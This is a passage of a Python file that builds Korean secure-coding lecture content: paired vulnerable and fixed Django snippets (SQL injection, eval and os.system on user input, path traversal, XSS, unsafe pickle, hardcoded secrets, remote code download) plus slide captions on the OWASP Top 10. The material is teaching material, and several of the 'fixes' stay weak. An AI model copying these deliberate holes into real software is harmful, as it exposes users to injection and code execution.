def build_secure_coding_lectures(code_block, screen_figure):
    access_control_guard = code_block(
        """
        from django.http import HttpResponseForbidden

        def user_profile(request, user_id):
            if request.user.id != user_id and not request.user.is_staff:
                return HttpResponseForbidden("권한이 없습니다.")
            return render_profile(user_id)
        """,
        "python",
    )

    access_control_vulnerable = code_block(
        """
        def view_profile(user_id):
            # 사용자 ID를 기반으로 프로필 정보를 가져오는 함수
            user = User.objects.get(id=user_id)
            return render(request, "profile.html", {"user": user})
        """,
        "python",
    )

    sql_injection_vulnerable = code_block(
        """
        def login(username, password):
            # 사용자 이름과 비밀번호를 기반으로 로그인 처리하는 함수
            connection = db.connect()
            cursor = connection.cursor()
            query = "SELECT * FROM users WHERE username = '%s' AND password = '%s'" % (username, password)
            cursor.execute(query)
            user = cursor.fetchone()
            connection.close()

            if user:
                return True
            else:
                return False
        """,
        "python",
    )

    brute_force_example = code_block(
        """
        import requests

        def crack_password(username):
            url = f"https://api.example.com/users/{username}"
            response = requests.get(url)

            if response.status_code == 200:
                user_data = response.json()
                password = user_data["password"]

                for i in range(10000):
                    if password == str(i):
                        print(f"Password found: {password}")
                        break

        if __name__ == "__main__":
            username = input("Enter username: ")
            crack_password(username)
        """,
        "python",
    )

    pickle_integrity_example = code_block(
        """
        import pickle

        def save_user_data(user_data):
            with open("user_data.pkl", "wb") as f:
                pickle.dump(user_data, f)

        def load_user_data():
            with open("user_data.pkl", "rb") as f:
                return pickle.load(f)

        if __name__ == "__main__":
            user_data = {"username": "admin", "password": "password123"}
            save_user_data(user_data)

        # ...

        loaded_user_data = load_user_data()
        print(loaded_user_data)
        """,
        "python",
    )

    logging_failure_example = code_block(
        """
        def login(username, password):
            if username == "admin" and password == "password123":
                print("Logged in successfully!")
                return True
            else:
                print("Invalid credentials.")
                return False

        if __name__ == "__main__":
            username = input("Enter username: ")
            password = input("Enter password: ")

            login(username, password)
        """,
        "python",
    )

    sql_update_vulnerable = code_block(
        """
        from django.shortcuts import render
        from django.db import connection

        def update_board(request):
            ......
            dbconn = connection

            with dbconn.cursor() as curs:
                # 외부로부터 입력받은 값을 검증 없이 사용할 경우 안전하지 않다
                name = request.POST.get('name', '')
                content_id = request.POST.get('content_id', '')

                # 사용자의 검증되지 않은 입력값을 사용해 동적 쿼리문 생성
                sql_query = "update board set name='" + name + "' where content_id='" + content_id + "'"

                # 외부 입력값이 검증 없이 쿼리로 포함되어 안전하지 않다
                curs.execute(sql_query)
                dbconn.commit()

            return render(request, '/success.html')
        """,
        "python",
    )

    parameterized_sql = code_block(
        """
        from django.shortcuts import render
        from django.db import connection

        def update_board(request):
            ......
            dbconn = connection

            with dbconn.cursor() as curs:
                # 외부로부터 입력받은 값을 검증 없이 사용할 경우 안전하지 않다
                name = request.POST.get('name', '')
                content_id = request.POST.get('content_id', '')

                # 외부 입력값 조작으로부터 안전한 인자화된 쿼리를 생성한다
                sql_query = 'update board set name=%s where content_id=%s'

                # 사용자의 입력값이 인자화된 쿼리에 바인딩 후 실행되므로 안전하다.
                curs.execute(sql_query, (name, content_id))
                dbconn.commit()

            return render(request, '/success.html')
        """,
        "python",
    )

    code_injection_vulnerable = code_block(
        """
        from django.shortcuts import render

        def route(request):
            # 외부에서 입력받은 값을 검증 없이 사용하면 안전하지 않다
            message = request.POST.get('message', '')

            # 외부 입력값을 검증 없이 eval 함수에 전달할 경우 의도하지 않은 코드가
            # 실행될 수 있어 위험하다
            ret = eval(message)

            return render(request, '/success.html', {'data': ret})
        """,
        "python",
    )

    input_validation = code_block(
        """
        from django.shortcuts import render

        def route(request):
            message = request.POST.get('message', '')

            # 사용자 입력을 영문, 숫자로 제한하면, 만약 입력값 내에 특수문자가 포함되어
            # 있을 경우 에러 메시지를 반환 한다
            if message.isalnum():
                ret = eval(message)
                return render(request, '/success.html', {'data': ret})

            return render(request, '/error.html')
        """,
        "python",
    )

    path_traversal_vulnerable = code_block(
        """
        import os
        from django.shortcuts import render

        def get_info(request):
            # 외부 입력값으로부터 파일명을 입력 받는다
            request_file = request.POST.get('request_file')
            (filename, file_ext) = os.path.splitext(request_file)
            file_ext = file_ext.lower()

            if file_ext not in ['.txt', '.csv']:
                return render(request, '/error.html', {'error': '파일을 열 수 없습니다.'})

            # 입력값을 검증 없이 파일 처리에 사용했다
            with open(request_file) as f:
                data = f.read()

            return render(request, '/success.html', {'data': data})
        """,
        "python",
    )

    safe_path = code_block(
        """
        import os
        from django.shortcuts import render

        def get_info(request):
            request_file = request.POST.get('request_file')
            (filename, file_ext) = os.path.splitext(request_file)
            file_ext = file_ext.lower()

            # 외부 입력값으로 받은 파일 이름은 검증하여 사용한다.
            if file_ext not in ['.txt', '.csv']:
                return render(request, '/error.html', {'error': '파일을 열 수 없습니다.'})

            # 파일 명에서 경로 조작 문자열을 필터링 한다.
            filename = filename.replace('..', '')
            filename = filename.replace('/', '')
            filename = filename.replace('\\\\', '')
            try:
                with open(filename + file_ext) as f:
                    data = f.read()
            except:
                return render(
                    request, "/error.html", {"error": "파일이 존재하지 않거나 열 수 없는 파일입니다."}
                )

            return render(request, '/success.html', {'data': data})
        """,
        "python",
    )

    xss_vulnerable = code_block(
        """
        from django.shortcuts import render
        from django.utils.safestring import mark_safe

        def profile_link(request):
            # 외부 입력값을 검증 없이 HTML 태그 생성의 인자로 사용
            profile_url = request.POST.get('profile_url')
            profile_name = request.POST.get('profile_name')
            object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

            # mark_safe함수는 Django의 XSS escape 정책을 따르지 않는다
            object_link = mark_safe(object_link)

            return render(request, 'my_profile.html', {'object_link': object_link})
        """,
        "python",
    )

    command_injection_vulnerable = code_block(
        """
        import os
        from django.shortcuts import render

        def execute_command(request):
            app_name_string = request.POST.get('app_name', '')

            # 입력 파라미터를 제한하지 않아 외부 입력값으로 전달된
            # 모든 프로그램이 실행될 수 있음
            os.system(app_name_string)

            return render(request, '/success.html')
        """,
        "python",
    )

    command_injection_safe = code_block(
        """
        import os
        from django.shortcuts import render
        ALLOW_PROGRAM = ['notepad', 'calc']

        def execute_command(request):
            app_name_string = request.POST.get('app_name', '')

            # 입력받은 파라미터가 허용된 시스템 명령어 목록에 포함되는지 검사
            if app_name_string not in ALLOW_PROGRAM:
                return render(request, '/error.html', {'error': '허용되지 않은 프로그램입니다.'})

            os.system(app_name_string)

            return render(request, '/success.html')
        """,
        "python",
    )

    file_upload_vulnerable = code_block(
        """
        from django.shortcuts import render
        from django.core.files.storage import FileSystemStorage

        def file_upload(request):
            if request.FILES['upload_file']:
                # 사용자가 업로드하는 파일을 검증 없이 저장하고 있어
                # 안전하지 않다
                upload_file = request.FILES['upload_file']

                fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')
                # 업로드 하는 파일에 대한 크기, 개수, 확장자 등을 검증하지 않음
                filename = fs.save(upload_file.name, upload_file)
                return render(request, '/success.html', {'filename': filename})

            return render(request, '/error.html', {'error': '파일 업로드 실패'})
        """,
        "python",
    )

    upload_validation = code_block(
        """
        import os
        from django.shortcuts import render
        from django.core.files.storage import FileSystemStorage
        # 업로드 하는 파일 개수, 크기, 확장자 제한
        FILE_COUNT_LIMIT = 5
        # 업로드 하는 파일의 최대 사이즈 제한 예 ) 5MB = 5*1024*1024
        FILE_SIZE_LIMIT = 5242880
        # 허용하는 확장자는 화이트리스트로 관리한다.
        WHITE_LIST_EXT = ['.jpg', '.jpeg']

        def file_upload(request):
            # 파일 개수 제한
            if len(request.FILES) == 0 or len(request.FILES) > FILE_COUNT_LIMIT:
                return render(request, '/error.html', {'error': '파일 개수 초과'})

            filename_list = []
            for filename, upload_file in request.FILES.items():
                # 파일 타입 체크
                if upload_file.content_type != 'image/jpeg':
                    return render(request, '/error.html', {'error': '파일 타입 오류'})

                # 파일 크기 제한
                if upload_file.size > FILE_SIZE_LIMIT:
                    return render(request, '/error.html', {'error': '파일사이즈 오류'})

                # 파일 확장자 검사
                file_name, file_ext = os.path.splitext(upload_file.name)
                if file_ext.lower() not in WHITE_LIST_EXT:
                    return render(request, '/error.html', {'error': '파일 타입 오류'})

                fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')
                for upload_file in request.FILES.values():
                    filename = fs.save(upload_file.name, upload_file)
                filename_list.append(filename)
            return render(request, "/success.html", {"filename_list": filename_list})
        """,
        "python",
    )

    legacy_input_validation = code_block(
        """
        message = request.POST.get("message", "")
        if not message.isalnum():
            return HttpResponseBadRequest("허용되지 않는 입력입니다.")

        # 사용자의 문자열을 코드로 실행하지 않는다.
        process_message(message)
        """,
        "python",
    )

    legacy_safe_path = code_block(
        """
        from pathlib import Path
        from django.http import HttpResponseBadRequest

        BASE_DIR = Path("/srv/app/data").resolve()

        filename = request.GET.get("file", "")
        target = (BASE_DIR / filename).resolve()

        if BASE_DIR not in target.parents or target.suffix not in {".txt", ".csv"}:
            return HttpResponseBadRequest("허용되지 않는 파일입니다.")

        return FileResponse(open(target, "rb"))
        """,
        "python",
    )

    legacy_upload_validation = code_block(
        """
        ALLOWED_CONTENT_TYPES = {"image/png", "image/jpeg"}
        MAX_SIZE = 2 * 1024 * 1024

        uploaded = request.FILES["file"]
        if uploaded.content_type not in ALLOWED_CONTENT_TYPES:
            return HttpResponseBadRequest("이미지 파일만 업로드할 수 있습니다.")
        if uploaded.size > MAX_SIZE:
            return HttpResponseBadRequest("파일이 너무 큽니다.")

        save_uploaded_image(uploaded)
        """,
        "python",
    )

    csrf_disabled_example = code_block(
        """
        MIDDLEWARE = [
            'django.contrib.sessions.middleware.SessionMiddleware',
            # MIDDLEWARE 목록에서 CSRF 항목을 삭제 또는 주석처리 하면
            # Django 앱에서 CSRF 유효성 검사가 전역적으로 제거된다
            # 'django.middleware.csrf.CsrfViewMiddleware',
            'django.contrib.auth.middleware.AuthenticationMiddleware',
            'django.contrib.messages.middleware.MessageMiddleware',
            'django.middleware.locale.LocaleMiddleware',
            ......
        ]

        from django.shortcuts import render
        from django.views.decorators.csrf import csrf_exempt

        # csrf_exempt 데코레이터로 미들웨어에서 보호되는 CSRF 기능을 해제한다
        @csrf_exempt
        def pay_to_point(request):
            user_id = request.POST.get('user_id', '')
            pay = request.POST.get('pay', '')
            product_info = request.POST.get('product_info', '')
            ret = handle_pay(user_id, pay, product_info)
            return render(request, '/view_wallet.html', {'wallet': ret})
        """,
        "python",
    )

    ssrf_allowlist = code_block(
        """
        from django.shortcuts import render
        import requests

        # 허용하는 도메인을 화이트리스트에 정의할 경우 DNS rebinding 공격 등에
        # 노출될 위험이 있어 신뢰할 수 있는 자원에 대한 IP를 사용해
        # 검증하는 것이 조금 더 안전하다
        ALLOW_SERVER_LIST = [
            'https://127.0.0.1/latest/',
            'https://192.168.0.1/user_data',
            'https://192.168.0.100/v1/public',
        ]

        def call_third_party_api(request):
            addr = request.POST.get('address', '')

            # 사용자가 입력한 URL을 화이트리스트로 검증한 후 그 결과를 반환하여
            # 검증되지 않은 주소로 요청을 보내지 않도록 제한한다
            if addr not in ALLOW_SERVER_LIST:
                return render(request, '/error.html', {'error': '허용되지 않은 서버입니다.'})

            result = requests.get(addr).text
            return render(request, '/result.html', {'result': result})
        """,
        "python",
    )

    http_response_splitting_safe = code_block(
        """
        from django.http import HttpResponse

        def route(request):
            content_type = request.POST.get('content-type')
            # 응답헤더에 포함될 수 있는 외부 입력값 내의 개행 문자를 제거한다
            content_type = content_type.replace('\\r', '')
            content_type = content_type.replace('\\n', '')

            ......
            res = HttpResponse()
            res['Content-Type'] = content_type
            return res
        """,
        "python",
    )

    integer_overflow_vulnerable = code_block(
        """
        import numpy as np

        def handle_data(number, pow):
            res = np.power(number, pow, dtype=np.int64)
            # 64비트를 넘어서는 숫자와 지수가 입력될 경우 오버플로우가 발생해 결과값이 0이 된다
            return res
        """,
        "python",
    )

    integer_overflow_safe = code_block(
        """
        import numpy as np

        MAX_NUMBER = np.iinfo(np.int64).max
        MIN_NUMBER = np.iinfo(np.int64).min

        def handle_data(number, pow):
            calculated = number ** pow

            # 파이썬 기본 자료형으로 큰 수를 계산한 후 이를 검사해 오버플로우 탐지
            if calculated > MAX_NUMBER or calculated < MIN_NUMBER:
                # 오버플로우 탐지 시 비정상 종료를 나타내는 -1 값 반환
                return -1

            res = np.power(number, pow, dtype=np.int64)
            return res
        """,
        "python",
    )

    format_string_vulnerable = code_block(
        """
        from django.shortcuts import render
        AUTHENTICATE_KEY = 'Password'

        def make_user_message(request):
            user_info = get_user_info(request.POST.get('user_id', ''))

            format_string = request.POST.get('msg_format', '')
            # 내부의 민감한 정보가 외부로 노출될 수 있다.
            # 사용자가 입력한 문자열을 포맷 문자열로 사용하고 있어 안전하지 않다
            message = format_string.format(user=user_info)

            return render(request, '/user_page.html', {'message': message})
        """,
        "python",
    )

    format_string_safe = code_block(
        """
        from django.shortcuts import render
        AUTHENTICATE_KEY = 'Password'

        def make_user_message(request):
            user_info = get_user_info(request.POST.get('user_id', ''))

            # 사용자가 입력한 문자열을 포맷 문자열로 사용하지 않아 안전하다
            message = 'user name is {}'.format(user_info.name)

            return render(request, '/user_page.html', {'message': message})
        """,
        "python",
    )

    des_weak_algorithm = code_block(
        """
        import base64
        from Crypto.Cipher import DES
        from Crypto.Util.Padding import pad

        def get_enc_text(plain_text, key):
            # 취약한 암호화 알고리즘인 DES를 사용하여 안전하지 않음
            cipher_des = DES.new(key, DES.MODE_ECB)
            encrypted_data = base64.b64encode(cipher_des.encrypt(pad(plain_text, 32)))

            return encrypted_data.decode('ASCII')
        """,
        "python",
    )

    hardcoded_secret = code_block(
        """
        import pymysql

        def query_execute(query):
            # user, passwd가 소스코드에 평문으로 하드코딩되어 있음
            dbconn = pymysql.connect(
                host='127.0.0.1',
                port='1234',
                user='root',
                passwd='1234',
                db='mydb',
                charset='utf8',
            )
            curs = dbconn.cursor()
            curs.execute(query)
            dbconn.commit()
            dbconn.close()
        """,
        "python",
    )

    security_config = code_block(
        """
        import pymysql
        import json

        def query_execute(query, config_path):
            with open(config_path, 'r') as config:
                # 설정 파일에서 user, passwd를 가져와 사용
                dbconf = json.load(fp=config)

            # 암호화되어 있는 블록 암호화 키를 복호화 해서 가져오는
            # 사용자 정의 함수
            blockKey = get_decrypt_key(dbconf['blockKey'])

            # 설정 파일에 암호화되어 있는 값을 가져와 복호화한 후에 사용
            dbUser = decrypt(blockKey, dbconf['user'])
            dbPasswd = decrypt(blockKey, dbconf['passwd'])

            dbconn = pymysql.connect(
                host=dbconf['host'],
                port=dbconf['port'],
                user=dbUser,
                passwd=dbPasswd,
                db=dbconf['db_name'],
                charset='utf8',
            )
            curs = dbconn.cursor()
            curs.execute(query)
            dbconn.commit()
            dbconn.close()
        """,
        "python",
    )

    random_otp_example = code_block(
        """
        import random

        def get_otp_number():
            random_str = ''

            # 시스템 현재 시간 값을 시드로 사용하고 있으면, 주요 보안 기능을 위한
            # 난수로 안전하지 않다
            for i in range(6):
                random_str += str(random.randrange(10))
            return random_str


        import secrets

        def get_otp_number():
            random_str = ''

            # 보안기능에 적합한 난수 생성용 secrets 라이브러리 사용
            for i in range(6):
                random_str += str(secrets.randbelow(10))  # os.urandom()
            return random_str
        """,
        "python",
    )

    cookie_expiry_example = code_block(
        """
        from django.http import HttpResponse

        def remind_user_state(request):
            res = HttpResponse()
            # 쿠키의 만료시간을 1년으로 과도하게 길게 설정하고 있어 안전하지 않다
            res.set_cookie('rememberme', 1, max_age=60 * 60 * 24 * 365)
            return res


        from django.http import HttpResponse

        def remind_user_state(request):
            res = HttpResponse()
            # 쿠키의 만료시간을 적절하게 부여하고 secure 및 httpOnly 옵션을 활성화 한다.
            res.set_cookie('rememberme', 1, max_age=60 * 60, secure=True, httponly=True)
            return res
        """,
        "python",
    )

    integrity_remote_download = code_block(
        """
        import requests

        def execute_remote_code():
            # 신뢰할 수 없는 사이트에서 코드를 다운로드
            url = "https://www.somewhere.com/storage/code.py"
            # 원격 코드 다운로드

            file = requests.get(url)
            remote_code = file.content
            file_name = 'save.py'

            with open(file_name, 'wb') as f:
                f.write(file.content)
                ......
        """,
        "python",
    )

    race_condition_lock = code_block(
        """
        import os
        import io
        import datetime
        import threading

        lock = threading.Lock()

        def write_shared_file(filename, content):
            # lock을 이용하여 여러 사용자가 동시에 파일에 접근하지 못하도록 제한
            with lock:
                if os.path.isfile(filename) is True:
                    f = open(filename, 'w')
                    f.seek(0, io.SEEK_END)
                    f.write(content)
                    f.close()

        def start():
            filename = './temp.txt'
            content = f"start time is {datetime.datetime.now()}"
            my_thread = threading.Thread(target=write_shared_file, args=(filename, content))
            my_thread.start()
        """,
        "python",
    )

    race_condition_vulnerable = code_block(
        """
        import os
        import io
        import datetime
        import threading

        def write_shared_file(filename, content):
            # 멀티스레드 환경에서는 다른 사용자들의 작업에 따라 파일이 사라질 수
            # 있기 때문에 공유 자원에 대해서는 검사와 사용을 동시에 해야 한다.
            if os.path.isfile(filename) is True:
                f = open(filename, 'w')
                f.seek(0, io.SEEK_END)
                f.write(content)
                f.close()

        def start():
            filename = './temp.txt'
            content = f"start time is {datetime.datetime.now()}"
            my_thread = threading.Thread(target=write_shared_file, args=(filename, content))
            my_thread.start()
        """,
        "python",
    )

    recursive_loop_example = code_block(
        """
        def factorial(num):
            # 재귀함수 탈출조건을 설정하지 않아 동작 중 에러 발생
            return num * factorial(num - 1)

        if __name__ == '__main__':
            itr = 5
            result = factorial(itr)
            print(str(itr) + ' 팩토리얼 값은 : ' + str(result))


        def factorial(num):
            # 재귀함수 사용 시에는 탈출 조건을 명시해야 한다.
            if num == 0:
                return 1
            else:
                return num * factorial(num - 1)

        if __name__ == '__main__':
            itr = 5
            result = factorial(itr)
            print(str(itr) + ' 팩토리얼 값은 : ' + str(result))


        import sys
        sys.setrecursionlimit(1000)
        """,
        "python",
    )

    error_page = code_block(
        """
        def handler500(request):
            return render(request, "errors/500.html", status=500)

        def download(request):
            filename = request.GET.get("filename")
            if not filename or not filename.strip():
                return HttpResponseBadRequest("파일 이름이 필요합니다.")
            return safe_download(filename)
        """,
        "python",
    )

    integrity_check = code_block(
        """
        import hashlib
        import pickle

        expected_hash = "공식적으로 제공된 SHA-256 해시값"
        data = request.body
        actual_hash = hashlib.sha256(data).hexdigest()

        if actual_hash != expected_hash:
            return HttpResponseBadRequest("변조된 데이터입니다.")

        obj = pickle.loads(data)
        """,
        "python",
    )

    error_handler_config = code_block(
        """
        from django.conf.urls import handler400, handler403, handler404, handler500

        # 사용자 정의 에러 페이지를 지정하고
        # views.py에 사용자 정의 에러 페이지에 대한 코드를 구현하여 사용한다.
        handler400 = "blog.views.error400"
        handler403 = "blog.views.error403"
        handler404 = "blog.views.error404"
        handler500 = "blog.views.error500"
        """,
        "python",
    )

    exception_crypto_default_key = code_block(
        """
        import base64
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        static_keys = [
            {
                "key": b"\\xb9\\xfd\\xa9\\xd2\\xefD\\x0b\\x7f\\xb2\\xbc\\x9c\\xf7\\x9c",
                "iv": b"\\xf1BZ\\x06\\xe3TP\\xd1\\x8a\\xad\\xdc\\xc3\\x08\\x88\\xda",
            },
            {
                "key": b"Z\\x01$..:\\xd4u3~\\xb6TS\\x08\\xcc\\xfc",
                "iv": b"\\xa1a=:\\xba\\xfczv]\\xca\\x83\\x9485\\x14\\x17",
            },
        ]

        def encryption(key_id, plain_text):
            static_key = {"key": b"0000000000000000", "iv": b"0000000000000000"}
            try:
                static_key = static_keys[key_id]
            except IndexError:
                # key 선택 중 오류 발생 시 기본으로 설정된 암호화 키인
                # "0000000000000000"으로 암호화가 수행된다.
                pass

            cipher_aes = AES.new(static_key["key"], AES.MODE_CBC, static_key["iv"])
            encrypted_data = base64.b64encode(cipher_aes.encrypt(pad(plain_text.encode(), 32)))
            return encrypted_data.decode("ASCII")
        """,
        "python",
    )

    exception_crypto_safe = code_block(
        """
        import base64
        import secrets
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        def encryption(key_id, plain_text):
            static_key = {"key": b"0000000000000000", "iv": b"0000000000000000"}
            try:
                static_key = static_keys[key_id]
            except IndexError:
                # key 선택 중 오류 발생 시 랜덤으로 암호화 키를 생성하도록 설정
                static_key = {"key": secrets.token_bytes(16), "iv": secrets.token_bytes(16)}
                static_keys.append(static_key)

            cipher_aes = AES.new(static_key["key"], AES.MODE_CBC, static_key["iv"])
            encrypted_data = base64.b64encode(cipher_aes.encrypt(pad(plain_text.encode(), 32)))
            return encrypted_data.decode("ASCII")
        """,
        "python",
    )

    null_pointer_vulnerable = code_block(
        """
        import os
        from django.shortcuts import render
        from xml.sax import make_parser
        from xml.sax.handler import feature_namespaces

        def parse_xml(request):
            filename = request.POST.get("filename")

            # filename의 None 체크를 하지 않아 에러 발생 가능
            if filename.count(".") > 0:
                name, ext = os.path.splitext(filename)
            else:
                ext = ""

            if ext == ".xml":
                parser = make_parser()
                parser.setFeature(feature_namespaces, True)
                handler = Handler()
                parser.setContentHandler(handler)
                parser.parse(filename)
                result = handler.root
                return render(request, "/success.html", {"result": result})
        """,
        "python",
    )

    null_pointer_safe = code_block(
        """
        import os
        from django.shortcuts import render
        from xml.sax import make_parser
        from xml.sax.handler import feature_namespaces

        def parse_xml(request):
            filename = request.POST.get("filename")

            # filename이 None인지 먼저 확인
            if filename is None or filename.strip() == "":
                return render(request, "/error.html", {"error": "파일 이름이 없습니다."})

            if filename.count(".") > 0:
                name, ext = os.path.splitext(filename)
            else:
                ext = ""

            if ext == ".xml":
                parser = make_parser()
                parser.setFeature(feature_namespaces, True)
                handler = Handler()
                parser.setContentHandler(handler)
                parser.parse(filename)
                result = handler.root
                return render(request, "/success.html", {"result": result})
        """,
        "python",
    )

    pickle_unsafe_load = code_block(
        """
        import pickle
        from django.shortcuts import render

        def load_user_object(request):
            # 사용자로부터 입력받은 알 수 없는 데이터를 역직렬화
            pickled_userinfo = pickle.dumps(request.POST.get("userinfo", ""))
            user_obj = pickle.loads(pickled_userinfo)

            return render(request, "/load_user_obj.html", {"obj": user_obj})
        """,
        "python",
    )

    pickle_hmac_check = code_block(
        """
        import hmac
        import hashlib
        import pickle
        from django.shortcuts import render

        def load_user_object(request):
            # 데이터 변조를 확인하기 위한 해시값
            hashed_pickle = request.POST.get("hashed_pickle", "")

            # 사용자로부터 입력받은 데이터를 직렬화
            pickled_userinfo = pickle.dumps(request.POST.get("userinfo", ""))

            # HMAC 검증을 위한 비밀키로 생성
            m = hmac.new(key="secret_key".encode("utf-8"), digestmod=hashlib.sha512)

            # 직렬화된 사용자 입력값을 해싱
            m.update(pickled_userinfo)

            # 전달받은 해시값과 직렬화 데이터의 해시값을 비교하여 검증
            if hmac.compare_digest(str(m.digest()), hashed_pickle):
                user_obj = pickle.loads(pickled_userinfo)
                return render(request, "/load_user_obj.html", {"obj": user_obj})
            else:
                return render(request, "/error.html", {"error": "신뢰할 수 없는 데이터입니다."})
        """,
        "python",
    )

    dns_lookup_fix = code_block(
        """
        def is_trust(host_domain_name):
            trusted = False
            trusted_host = "trust.example.com"
            # 공격자에 의해 실행되는 서버의 DNS가 변경될 수 있으므로
            # 안전하지 않다
            if trusted_host == host_name:
                trusted = True
            return trusted


        import socket

        def is_trust(host_domain_name):
            trusted = False
            trusted_ip = "192.168.10.7"
            # 실제 서버의 IP 주소를 비교하여 DNS 변조에 대응
            dns_resolved_ip = socket.gethostbyname(host_domain_name)

            if trusted_ip == dns_resolved_ip:
                trusted = True
            return trusted
        """,
        "python",
    )

    sdlc_flow = code_block(
        """
        교육
        -> 계획과 분석: 보안 버그, 프라이버시 위험, 보안 요구사항 확인
        -> 설계: 위협 모델링, 데이터 흐름, 공격 가능 지점 분석
        -> 구현: 금지 함수, 위험 API, 시큐어 코딩 규칙 확인
        -> 검증: 테스트, 퍼징, 보안 점검
        -> 배포: 사고 대응 계획 수립
        -> 대응: 실제 사고 발생 시 대응과 개선
        """,
        "text",
    )

    sc01 = "시큐어코딩-01-강의-오리엔테이션과-시큐어-코딩-개요"
    sc01_outline = screen_figure(
        "secure-coding",
        sc01,
        3,
        "시큐어 코딩 과목 전체 흐름",
        "1강은 Secure Coding의 의미를 잡고, 이후 OWASP Top 10과 유형별 시큐어 코딩 기법, 마지막 SDLC로 이어지는 전체 구성을 소개한다.",
    )
    sc01_definition = screen_figure(
        "secure-coding",
        sc01,
        9,
        "Secure Coding의 정의",
        "시큐어 코딩은 소프트웨어 취약점을 방지하고 공격으로부터 보호하기 위한 코딩 기법과 개발 프로세스라는 점을 정리한다.",
    )
    sc01_sdlc = screen_figure(
        "secure-coding",
        sc01,
        15,
        "소프트웨어 개발 생명주기",
        "계획, 요구사항 정의, 설계, 개발, 테스트, 배포·유지보수까지 소프트웨어는 여러 단계를 거쳐 완성된다.",
    )
    sc01_development_stage = screen_figure(
        "secure-coding",
        sc01,
        27,
        "시큐어 코딩이 집중하는 구현 단계",
        "강의는 개발 생명주기 중 Stage 4 Development를 강조하며, 구현 단계에서 보안 약점을 미리 제거하는 것이 시큐어 코딩의 중심이라고 설명한다.",
    )
    sc01_known_vulns = screen_figure(
        "secure-coding",
        sc01,
        33,
        "알려진 취약점과 패치 미흡",
        "침해 피해 조직 상당수가 이미 알려진 취약점 패치를 적용하지 않았거나, 취약한 상태라는 사실을 알지 못했다는 통계를 제시한다.",
    )
    sc01_cost = screen_figure(
        "secure-coding",
        sc01,
        45,
        "결함 발견 시점과 수정 비용",
        "요구사항 단계에서 발견한 결함을 1배 비용으로 잡으면, 코딩·테스트·배포 이후로 갈수록 수정 비용이 7배, 15배, 30~100배까지 커질 수 있다.",
    )
    sc01_sdl = screen_figure(
        "secure-coding",
        sc01,
        49,
        "Security Development Lifecycle",
        "SDL은 분석, 설계, 구현, 검증, 배포, 대응 단계 전체에 보안을 넣는 방식이며, 시큐어 코딩은 그중 구현 단계의 핵심 활동이다.",
    )
    sc01_techniques = screen_figure(
        "secure-coding",
        sc01,
        53,
        "시큐어 코딩 기법 분류",
        "입력 데이터 검증, 보안 기능 적용, 시간 및 상태 처리, 에러 처리, 코드 오류, 캡슐화, API 오용 등 이후 강의에서 다룰 기법 범주를 나열한다.",
    )
    sc02 = "시큐어코딩-02-OWASP-Top-10-1부"
    sc02_owasp = screen_figure(
        "secure-coding",
        sc02,
        5,
        "OWASP Top 10 소개",
        "OWASP Top 10은 웹 애플리케이션 보안에서 가장 중요한 10가지 취약점을 정리한 목록이며, 웹 개발자와 보안 전문가가 널리 사용하는 기준이다.",
    )
    sc02_access_control = screen_figure(
        "secure-coding",
        sc02,
        11,
        "Broken Access Control의 주요 유형",
        "최소 권한 원칙 위반, 권한 검사 우회, 다른 사용자 정보 접근, API 접근 제어 부족, 권한 상승이 접근 제어 실패의 대표 예시다.",
    )
    sc02_url_tampering = screen_figure(
        "secure-coding",
        sc02,
        25,
        "URL 매개변수 조작 예시",
        "사용자 ID를 URL 매개변수로 받아 그대로 조회하면 공격자가 user_id 값을 바꿔 다른 사용자의 프로필 정보를 볼 수 있다.",
    )
    sc02_crypto = screen_figure(
        "secure-coding",
        sc02,
        33,
        "Cryptographic Failures 예시",
        "오래된 알고리즘, 기본 암호화 키, 부채널 정보 노출, HSTS 누락처럼 암호화와 전송 보호가 잘못되면 민감정보가 노출될 수 있다.",
    )
    sc02_injection_code = screen_figure(
        "secure-coding",
        sc02,
        49,
        "SQL Injection 취약 코드",
        "사용자 이름과 비밀번호를 문자열 포맷으로 SQL에 직접 삽입하면 공격자가 입력값에 SQL 문법을 섞어 쿼리를 조작할 수 있다.",
    )
    sc02_insecure_design = screen_figure(
        "secure-coding",
        sc02,
        57,
        "Insecure Design과 위협 분석 부족",
        "Insecure Design은 구현 실수보다 앞선 설계 과정의 보안 결함이며, 요구사항 분석과 설계 단계의 위협 분석 부족이 원인이 될 수 있다.",
    )
    sc02_misconfiguration = screen_figure(
        "secure-coding",
        sc02,
        63,
        "Security Misconfiguration 예시",
        "불필요한 기능, 기본 계정, 과도한 오류 메시지, 업그레이드 시 보안 기능 누락처럼 보안 설정이 잘못되면 공격 표면이 커진다.",
    )
    sc02_default_admin = screen_figure(
        "secure-coding",
        sc02,
        75,
        "기본 관리자 경로와 기본 계정 위험",
        "기본 관리자 페이지 경로와 기본 아이디·비밀번호를 그대로 사용하면 공격자가 쉽게 관리 화면을 찾고 계정 접속을 시도할 수 있다.",
    )
    sc03 = "시큐어코딩-03-OWASP-Top-10-2부"
    sc03_outdated = screen_figure(
        "secure-coding",
        sc03,
        3,
        "Vulnerable and Outdated Components",
        "운영체제, 웹 서버, DBMS, 애플리케이션, API, 런타임, 라이브러리 등 오래된 구성요소를 계속 쓰면 알려진 취약점에 노출된다.",
    )
    sc03_django_cve = screen_figure(
        "secure-coding",
        sc03,
        11,
        "공개된 Django CVE exploit 예시",
        "업데이트 전 패키지를 사용하면 이미 공개된 CVE 설명과 exploit 코드를 공격자가 그대로 재활용할 수 있다.",
    )
    sc03_auth_list = screen_figure(
        "secure-coding",
        sc03,
        23,
        "Identification and Authentication Failures",
        "브루트포스 허용, 잘 알려진 비밀번호 허용, URL 세션 식별자 노출, 세션 재사용, 타임아웃 부재가 인증 실패의 대표 예시다.",
    )
    sc03_bruteforce_code = screen_figure(
        "secure-coding",
        sc03,
        31,
        "로그인 시도 횟수 제한 부재와 브루트포스",
        "로그인 실패 횟수 제한이 없으면 공격자가 반복 요청으로 비밀번호를 추측하고 계정 접근 권한을 얻을 수 있다.",
    )
    sc03_integrity_list = screen_figure(
        "secure-coding",
        sc03,
        37,
        "Software and Data Integrity Failures",
        "신뢰할 수 없는 소스와 저장소, 안전하지 않은 CI/CD, 악성 업데이트, 역직렬화 무결성 검증 부재가 무결성 실패의 예시다.",
    )
    sc03_pickle_code = screen_figure(
        "secure-coding",
        sc03,
        47,
